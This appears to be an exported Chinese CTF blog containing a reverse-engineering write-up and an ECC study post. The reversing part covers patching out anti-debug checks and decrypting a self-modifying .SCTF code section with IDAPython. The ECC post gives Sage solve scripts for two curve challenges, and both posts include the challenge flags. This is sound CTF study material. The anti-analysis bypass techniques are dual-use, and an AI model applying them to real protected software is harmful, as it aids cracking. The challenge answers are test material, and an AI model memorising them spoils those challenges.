<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">004023</span>EF loc_4023EF:                             ; DATA XREF: .rdata:stru_407B58↓o</span><br><span class="line">.text:<span class="number">004023</span>EF                 mov     esp, [ebp+ms_exc.old_esp] ; HANDLER_FUNCTION</span><br><span class="line">.text:<span class="number">004023F</span>2                 lea     eax, [ebp+pbDebuggerPresent]</span><br><span class="line">.text:<span class="number">004023F</span>5                 push    eax             ; pbDebuggerPresent</span><br><span class="line">.text:<span class="number">004023F</span>6                 call    ds:GetCurrentProcess</span><br><span class="line">.text:<span class="number">004023F</span>C                 push    eax             ; hProcess</span><br><span class="line">.text:<span class="number">004023F</span>D                 call    ds:CheckRemoteDebuggerPresent</span><br><span class="line">.text:<span class="number">00402403</span>                 call    ds:IsDebuggerPresent</span><br><span class="line">.text:<span class="number">00402409</span>                 test    eax, eax</span><br><span class="line">.text:<span class="number">0040240B</span>                 jnz     <span class="type">short</span> loc_4023B9</span><br><span class="line">.text:<span class="number">0040240</span>D                 cmp     [ebp+pbDebuggerPresent], eax</span><br><span class="line">.text:<span class="number">00402410</span>                 jnz     <span class="type">short</span> loc_4023B9</span><br><span class="line">.text:<span class="number">00402412</span>                 mov     eax, [ebp+var_24]</span><br><span class="line">.text:<span class="number">00402415</span>                 mov     edx, [eax+<span class="number">10</span>h]</span><br><span class="line">.text:<span class="number">00402418</span>                 mov     ecx, [eax+<span class="number">0</span>Ch]</span><br><span class="line">.text:<span class="number">0040241B</span>                 add     ecx, [ebp+var_28]</span><br><span class="line">.text:<span class="number">0040241</span>E                 mov     esi, [ebp+var_2C]</span><br><span class="line">.text:<span class="number">00402421</span>                 lea     edi, [esi+<span class="number">1</span>]</span><br><span class="line">.text:<span class="number">00402424</span></span><br><span class="line">.text:<span class="number">00402424</span> loc_402424:                             ; CODE XREF: sub_402320+<span class="number">109</span>↓j</span><br><span class="line">.text:<span class="number">00402424</span>                 mov     al, [esi]</span><br><span class="line">.text:<span class="number">00402426</span>                 inc     esi</span><br><span class="line">.text:<span class="number">00402427</span>                 test    al, al</span><br><span class="line">.text:<span class="number">00402429</span>                 jnz     <span class="type">short</span> loc_402424</span><br><span class="line">.text:<span class="number">0040242B</span>                 sub     esi, edi</span><br><span class="line">.text:<span class="number">0040242</span>D                 push    esi</span><br><span class="line">.text:<span class="number">0040242</span>E                 push    ecx</span><br><span class="line">.text:<span class="number">0040242F</span>                 call    sub_402450      ; !!!</span><br><span class="line">.text:<span class="number">00402434</span>                 add     esp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">00402437</span>                 jmp     <span class="type">short</span> loc_4023B9</span><br></pre></td></tr></table></figure>

<p>这里经过一系列反调试检测后 调用了sub_402450函数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_402450</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// cl</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( a4 &gt; <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">LABEL_5:</span><br><span class="line">      <span class="keyword">if</span> ( result &gt;= a2 )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( result &lt; a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = aSycloversyclov[v7++];               <span class="comment">// sycloversyclover</span></span><br><span class="line">      *(_BYTE *)(result + a1) = ~(*(_BYTE *)(result + a1) ^ v8);</span><br><span class="line">      ++result;</span><br><span class="line">      <span class="keyword">if</span> ( v7 &gt;= a4 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续看main 首先调用了</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __thiscall <span class="title">sub_402320</span><span class="params">(_DWORD *<span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  __int16 v2; <span class="comment">// bx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="keyword">this</span>[<span class="number">15</span>];</span><br><span class="line">  v2 = *(_WORD *)((<span class="type">char</span> *)<span class="keyword">this</span> + v1 + <span class="number">6</span>);</span><br><span class="line">  v3 = (<span class="type">char</span> *)<span class="keyword">this</span> + v1 + <span class="number">248</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="built_in">strcmp</span>(v3, <span class="string">&quot;.SCTF&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">      v5 = v5 &lt; <span class="number">0</span> ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">DebugBreak</span>();</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v3 += <span class="number">40</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里DebugBreak()就是触发断点异常！<br>这里v5是strcmp的值 也就是当v3&#x3D;&#x3D;.SCTF时 会触发这个异常<br>猜测这里.SCTF是自带的代码节区段<br>继续分析</p>
<p>接下来程序调用了sub_404000 跟踪发现是一段被加密的代码段 而且正是 .SCTF<br>所以sub_402450函数是SMC的解密代码<br>我们也直接ida_python 解密后编译成函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">addstr = <span class="number">0x404000</span> </span><br><span class="line">addend = <span class="number">0x405000</span> </span><br><span class="line">key = <span class="string">&quot;sycloversyclover&quot;</span> </span><br><span class="line">j = <span class="number">0</span> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(addstr,addend,<span class="number">1</span>): </span><br><span class="line">  data = (~(idc.get_wide_byte(i) ^ <span class="built_in">ord</span>(key[j%<span class="built_in">len</span>(key)]))&amp;<span class="number">0xff</span>) </span><br><span class="line">  ida_bytes.patch_byte(i,data) </span><br><span class="line">  j += <span class="number">1</span> </span><br></pre></td></tr></table></figure>

<p>得到这个函数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">sub_404000</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// dl</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(aPvfqyc4ttc2uxr); ++i )</span><br><span class="line">    --aPvfqyc4ttc2uxr[i];</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  result = <span class="built_in">strlen</span>(aPvfqyc4ttc2uxr);</span><br><span class="line">  <span class="keyword">if</span> ( (result &amp; <span class="number">0xFFFFFFFE</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = result - v1;</span><br><span class="line">      v4 = *(_BYTE *)(v3 + <span class="number">0x409017</span>);</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">4231191</span>) = aPvfqyc4ttc2uxr[v1];</span><br><span class="line">      aPvfqyc4ttc2uxr[v1++] = v4;</span><br><span class="line">      result = <span class="built_in">strlen</span>(aPvfqyc4ttc2uxr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v1 &lt; result &gt;&gt; <span class="number">1</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对字符串作了个变换<br>本来应该是可以C++模拟跑一下出结果 但本地出了点bug 直接把前面的反调试patch掉 让程序运行一遍<br>得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nKnbHsgqD3aNEB91jB3gEzAr+IklQwT1bSs3+bXpeuo=</span><br></pre></td></tr></table></figure>

<p>结合FindCrypt插件的分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Address	Rules file	Name	String	Value</span><br><span class="line">.rdata:004059E0	global	RijnDael_AES_4059E0	$c0	b&#x27;\xa5cc\xc6\x84||\xf8&#x27;</span><br><span class="line">.rdata:00405DE0	global	RijnDael_AES_CHAR_405DE0	$c0	b&#x27;c|w&#123;\xf2ko\xc50\x01g+\xfe\xd7\xabv\xca\x82\xc9&#125;\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0&#x27;</span><br><span class="line">.rdata:00405DE0	global	RijnDael_AES_LONG_405DE0	$c0	b&#x27;c|w&#123;\xf2ko\xc50\x01g+\xfe\xd7\xabv\xca\x82\xc9&#125;\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0&#x27;</span><br><span class="line">.rdata:00407390	global	BASE64_table_407390	$c0	b&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br></pre></td></tr></table></figure>

<p>这里用了AES和Base64<br>怎么找到哪些是加密函数呢？<br>分析main<br>唯一可能有加密的地方在这</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">v4 = <span class="built_in">sub_4020D0</span>(Block, (<span class="type">int</span>)v23);</span><br></pre></td></tr></table></figure>

<p>跟进<br>在里面的sub_401690函数中找到了AES<br>几个关键处</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">*(_OWORD *)(<span class="keyword">this</span> + <span class="number">980</span>) = xmmword_407360;</span><br><span class="line"><span class="built_in">memcpy</span>((<span class="type">void</span> *)(<span class="keyword">this</span> + <span class="number">1012</span>), &amp;xmmword_407360, *(_DWORD *)(<span class="keyword">this</span> + <span class="number">972</span>));</span><br><span class="line">...</span><br><span class="line">v16 = <span class="string">&quot;sycloversyclover&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>找到xmmword的值 <code>66746373667463736674637366746373h</code><br>其实就是 <code>ftcsftcsftcsftcs</code><br>注意端序问题 转一下得到 <code>sctfsctfsctfsctf</code><br>找在线网站解一解</p>
<p><img src="https://s2.loli.net/2023/12/11/4D8V1fKISmkTG6O.png" alt="img"></p>
<p>最后flag : sctf{Ae3_C8c_I28_pKcs79ad4}</p>
<hr>
<hr>
<p>这题独立做真的够呛的 目前只是在做题的角度投机取巧的解出flag 要完全弄明白还得继续练</p>
]]></content>
      <categories>
        <category>CTF-Reverse</category>
      </categories>
  </entry>
  <entry>
    <title>Crypto-ECC</title>
    <url>/2023/12/08/Crypto-ECC/</url>
    <content><![CDATA[<p>学习ECC知识点以及相关题目</p>
<span id="more"></span>
<p>以前断断续续看过ECC 学的很不扎实 一些算法也没理解原理 现在有一定群论基础后再来学一遍</p>
<h1 id="相关知识点-定义"><a href="#相关知识点-定义" class="headerlink" title="相关知识点&#x2F;定义"></a>相关知识点&#x2F;定义</h1><p>其实<a href="https://ohmygodlin.github.io/ctf/crypto/2020/12/28/%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%AF%86%E7%A0%81ECC%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/" target="_blank">这篇</a>讲的挺好的</p>
<h2 id="椭圆曲线"><a href="#椭圆曲线" class="headerlink" title="椭圆曲线"></a>椭圆曲线</h2><p>ECC里面只考虑 <code>Ep : y^2 === x^3 + a*x + b mod p</code> 形式</p>
<ul>
<li>Δ &#x3D; -16(4*a^3+27b)≠0 保证曲线光滑</li>
<li>a,b ∈ K K为E的基础域</li>
<li>点O∞是曲线的唯一无穷远点</li>
</ul>
<h2 id="椭圆曲线上的加法"><a href="#椭圆曲线上的加法" class="headerlink" title="椭圆曲线上的加法"></a>椭圆曲线上的加法</h2><p>借佬图：<br><img src="https://s2.loli.net/2023/12/08/gTdyjkJezQV8IhM.png" alt="img"></p>
<p>要熟练掌握公式 好多题目都可以用加法公式转成代数方程来解</p>
<h2 id="What-is-ECC"><a href="#What-is-ECC" class="headerlink" title="What is ECC?"></a>What is ECC?</h2><p><img src="https://s2.loli.net/2023/12/08/miK8AzOIstlZ3xa.png" alt="img"></p>
<h2 id="Sage相关函数实现"><a href="#Sage相关函数实现" class="headerlink" title="Sage相关函数实现"></a>Sage相关函数实现</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">E = EllipticCurve(GF(p),[a,b]) <span class="comment"># y^2 === x^3 + a*x + b mod p</span></span><br><span class="line"></span><br><span class="line">E.random_point() <span class="comment"># 在椭圆曲线E上随机选一点</span></span><br><span class="line"></span><br><span class="line">E.set_order() <span class="comment"># 设置椭圆曲线的阶</span></span><br><span class="line"></span><br><span class="line">E.point((x,y)) <span class="comment"># 创建一个曲线上的点对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 求解私钥 k K = k*G</span></span><br><span class="line"><span class="comment"># 自动选择 BSGS 或者 Pohlig-Hellman算法</span></span><br><span class="line">discrete_log(K,G,operation=<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">G.discrete_log(K)</span><br><span class="line"></span><br><span class="line">E.order() <span class="comment"># 计算椭圆曲线上点的阶</span></span><br><span class="line"><span class="built_in">print</span>(factor(E.order()))</span><br><span class="line"><span class="comment"># 2 * 3^3 * 5 * 7 * 212117 * 302426983 * 10362951863095936421891634612647340060175499</span></span><br><span class="line"><span class="built_in">print</span>(*factor(E.order()))</span><br><span class="line"><span class="comment">#(2, 1) (3, 3) (5, 1) (7, 1) (212117, 1) (302426983, 1) (10362951863095936421891634612647340060175499, 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用Pollard rho算法求解私钥</span></span><br><span class="line">discrete_log_rho(K,G,operation=<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用Pollard Lambda算法求解私钥，能够确定所求值在某一小范围时效率较高</span></span><br><span class="line">discrete_log_lambda(K,G,bound,operation=<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>通过例题来熟悉这些概念和方法吧</p>
<h2 id="2022巅峰极客-point-power"><a href="#2022巅峰极客-point-power" class="headerlink" title="2022巅峰极客 point-power"></a>2022巅峰极客 point-power</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag)==<span class="number">42</span></span><br><span class="line">p=getPrime(<span class="number">600</span>)</span><br><span class="line">a=bytes_to_long(flag)</span><br><span class="line">b=randrange(<span class="number">2</span>,p-<span class="number">1</span>)</span><br><span class="line">E=EllipticCurve(GF(p),[a,b])</span><br><span class="line">G=E.random_element()</span><br><span class="line"></span><br><span class="line">x1,y1,_=G</span><br><span class="line">G=<span class="number">2</span>*G</span><br><span class="line">x2,y2,_=G</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;b = <span class="subst">&#123;b&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;x1 = <span class="subst">&#123;x1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;x2 = <span class="subst">&#123;x2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623</span></span><br><span class="line"><span class="string">b = 1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147</span></span><br><span class="line"><span class="string">x1 = 2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740</span></span><br><span class="line"><span class="string">x2 = 1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里可以直接用加法公式<br>写出来消元得到只含x1的方程 sage解就行了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = <span class="number">3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623</span></span><br><span class="line">b = <span class="number">1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147</span></span><br><span class="line">x1 = <span class="number">2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740</span></span><br><span class="line">x2 = <span class="number">1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PR.&lt;a&gt; = PolynomialRing(Zmod(p))</span></span><br><span class="line"><span class="comment"># f = (3*x1**2+a)^2-4*(x1^3+a*x1+b)*(2*x1+x2)</span></span><br><span class="line"><span class="comment"># f = f.monic()</span></span><br><span class="line"><span class="comment"># print(f.roots())</span></span><br><span class="line"></span><br><span class="line">[(<span class="number">918875439627055594259552478508551728381826199399685938622511660790511287097297184191298481453657480331998130281110691444641445094194011219176724349745237973925436007792522611119050</span>, <span class="number">1</span>), (<span class="number">56006392793430010663016642098239513811260175999551893260401436587175373756825079518464264729364083325</span>, <span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">flags = [<span class="number">918875439627055594259552478508551728381826199399685938622511660790511287097297184191298481453657480331998130281110691444641445094194011219176724349745237973925436007792522611119050</span>,<span class="number">56006392793430010663016642098239513811260175999551893260401436587175373756825079518464264729364083325</span>]</span><br><span class="line"><span class="keyword">for</span> flag <span class="keyword">in</span> flags:</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(flag))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;fa76cfb1-0052-4416-914d-91517bcebd52&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="watevrCTF2019-ECC-RSA"><a href="#watevrCTF2019-ECC-RSA" class="headerlink" title="watevrCTF2019 ECC-RSA"></a>watevrCTF2019 ECC-RSA</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fastecdsa.curve <span class="keyword">import</span> P521 <span class="keyword">as</span> Curve</span><br><span class="line"><span class="keyword">from</span> fastecdsa.point <span class="keyword">import</span> Point</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, isPrime</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_rsa_primes</span>(<span class="params">G</span>):</span><br><span class="line">	urand = bytes_to_long(urandom(<span class="number">521</span>//<span class="number">8</span>))</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		s = getrandbits(<span class="number">521</span>) ^ urand</span><br><span class="line"></span><br><span class="line">		Q = s*G</span><br><span class="line">		<span class="keyword">if</span> isPrime(Q.x) <span class="keyword">and</span> isPrime(Q.y):</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;ECC Private key:&quot;</span>, <span class="built_in">hex</span>(s))</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;RSA primes:&quot;</span>, <span class="built_in">hex</span>(Q.x), <span class="built_in">hex</span>(Q.y))</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;Modulo:&quot;</span>, <span class="built_in">hex</span>(Q.x * Q.y))</span><br><span class="line">			<span class="keyword">return</span> (Q.x, Q.y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">int</span>.from_bytes(<span class="built_in">input</span>(), byteorder=<span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line">ecc_p = Curve.p</span><br><span class="line">a = Curve.a</span><br><span class="line">b = Curve.b</span><br><span class="line"></span><br><span class="line">Gx = Curve.gx</span><br><span class="line">Gy = Curve.gy</span><br><span class="line">G = Point(Gx, Gy, curve=Curve)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">p, q = gen_rsa_primes(G)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file_out = <span class="built_in">open</span>(<span class="string">&quot;downloads/ecc-rsa.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line">file_out.write(<span class="string">&quot;ECC Curve Prime: &quot;</span> + <span class="built_in">hex</span>(ecc_p) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">file_out.write(<span class="string">&quot;Curve a: &quot;</span> + <span class="built_in">hex</span>(a) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">file_out.write(<span class="string">&quot;Curve b: &quot;</span> + <span class="built_in">hex</span>(b) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">file_out.write(<span class="string">&quot;Gx: &quot;</span> + <span class="built_in">hex</span>(Gx) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">file_out.write(<span class="string">&quot;Gy: &quot;</span> + <span class="built_in">hex</span>(Gy) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">file_out.write(<span class="string">&quot;e: &quot;</span> + <span class="built_in">hex</span>(e) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">file_out.write(<span class="string">&quot;p * q: &quot;</span> + <span class="built_in">hex</span>(n) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(flag, e, n)</span><br><span class="line">file_out.write(<span class="string">&quot;ciphertext: &quot;</span> + <span class="built_in">hex</span>(c) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ECC Curve Prime: 0x1ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span><br><span class="line">Curve a: -0x3</span><br><span class="line">Curve b: 0x51953eb9618e1c9a1f929a21a0b68540eea2da725b99b315f3b8b489918ef109e156193951ec7e937b1652c0bd3bb1bf073573df883d2c34f1ef451fd46b503f00</span><br><span class="line">Gx: 0xc6858e06b70404e9cd9e3ecb662395b4429c648139053fb521f828af606b4d3dbaa14b5e77efe75928fe1dc127a2ffa8de3348b3c1856a429bf97e7e31c2e5bd66</span><br><span class="line">Gy: 0x11839296a789a3bc0045c8a5fb42c7d1bd998f54449579b446817afbd17273e662c97ee72995ef42640c550b9013fad0761353c7086a272c24088be94769fd16650</span><br><span class="line">e: 0x10001</span><br><span class="line">p * q: 0x118aaa1add80bdd0a1788b375e6b04426c50bb3f9cae0b173b382e3723fc858ce7932fb499cd92f5f675d4a2b05d2c575fc685f6cf08a490d6c6a8a6741e8be4572adfcba233da791ccc0aee033677b72788d57004a776909f6d699a0164af514728431b5aed704b289719f09d591f5c1f9d2ed36a58448a9d57567bd232702e9b28f</span><br><span class="line">ciphertext: 0x3862c872480bdd067c0c68cfee4527a063166620c97cca4c99baff6eb0cf5d42421b8f8d8300df5f8c7663adb5d21b47c8cb4ca5aab892006d7d44a1c5b5f5242d88c6e325064adf9b969c7dfc52a034495fe67b5424e1678ca4332d59225855b7a9cb42db2b1db95a90ab6834395397e305078c5baff78c4b7252d7966365afed9e</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>利用 <code>n = Q.x*Q.y</code><br>且(Q.x,Q.y)在曲线上来联立求解<br>这里我们构造 <code>(Q.x*Q.y)^2-n^2===0 mod P</code> 来求解</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">P = <span class="number">0x1ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line">a = -<span class="number">0x3</span></span><br><span class="line">b = <span class="number">0x51953eb9618e1c9a1f929a21a0b68540eea2da725b99b315f3b8b489918ef109e156193951ec7e937b1652c0bd3bb1bf073573df883d2c34f1ef451fd46b503f00</span></span><br><span class="line">Gx = <span class="number">0xc6858e06b70404e9cd9e3ecb662395b4429c648139053fb521f828af606b4d3dbaa14b5e77efe75928fe1dc127a2ffa8de3348b3c1856a429bf97e7e31c2e5bd66</span></span><br><span class="line">Gy = <span class="number">0x11839296a789a3bc0045c8a5fb42c7d1bd998f54449579b446817afbd17273e662c97ee72995ef42640c550b9013fad0761353c7086a272c24088be94769fd16650</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = <span class="number">0x118aaa1add80bdd0a1788b375e6b04426c50bb3f9cae0b173b382e3723fc858ce7932fb499cd92f5f675d4a2b05d2c575fc685f6cf08a490d6c6a8a6741e8be4572adfcba233da791ccc0aee033677b72788d57004a776909f6d699a0164af514728431b5aed704b289719f09d591f5c1f9d2ed36a58448a9d57567bd232702e9b28f</span></span><br><span class="line">c = <span class="number">0x3862c872480bdd067c0c68cfee4527a063166620c97cca4c99baff6eb0cf5d42421b8f8d8300df5f8c7663adb5d21b47c8cb4ca5aab892006d7d44a1c5b5f5242d88c6e325064adf9b969c7dfc52a034495fe67b5424e1678ca4332d59225855b7a9cb42db2b1db95a90ab6834395397e305078c5baff78c4b7252d7966365afed9e</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># E = EllipticCurve(GF(P),a,b)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PR.&lt;x&gt; = PolynomialRing(Zmod(P))</span></span><br><span class="line"><span class="comment"># f = (x^3+a*x+b)*(x^2)-n^2</span></span><br><span class="line"><span class="comment"># f = f.monic()</span></span><br><span class="line"><span class="comment"># for root in f.roots():</span></span><br><span class="line"><span class="comment">#     if(is_prime(root[0])):</span></span><br><span class="line"><span class="comment">#         print(root[0])</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">4573744216059593260686660411936793507327994800883645562370166075007970317346237399760397301505506131100113886281839847419425482918932436139080837246914736557</span></span><br><span class="line">q = n//p</span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> modinv</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">d = modinv(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br><span class="line"><span class="comment"># watevr&#123;factoring_polynomials_over_finite_fields_is_too_ez&#125;</span></span><br></pre></td></tr></table></figure>

